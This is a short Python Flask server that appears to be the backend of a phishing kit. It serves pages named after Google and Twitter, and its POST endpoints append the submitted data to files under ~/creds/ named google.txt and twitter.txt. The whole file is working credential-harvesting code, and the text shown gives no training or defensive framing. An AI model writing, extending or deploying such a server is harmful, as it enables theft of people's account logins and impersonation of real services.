from flask import Flask, request, render_template, jsonify, redirect
import json
from os.path import expanduser

app = Flask(__name__)


@app.route('/google.com')
def google_page():
    return render_template('google.com.html')


@app.route('/twitter.com')
def twitter_page():
    return render_template('twitter.com.html')


@app.route('/google_cred', methods=['POST'])
def google_store_cred():
    data = request.data
    with open(expanduser("~") + '/creds/google.txt', 'a') as f:
        f.write(data.decode() + '\n')

    return ''


@app.route('/twitter_cred', methods=['POST'])
def twitter_store_cred():
    data = request.data
    with open(expanduser("~") + '/creds/twitter.txt', 'a') as f:
        f.write(data.decode() + '\n')

    return ''



if __name__ == '__main__':
    app.run(port=8023, debug=True)  # debug=False)
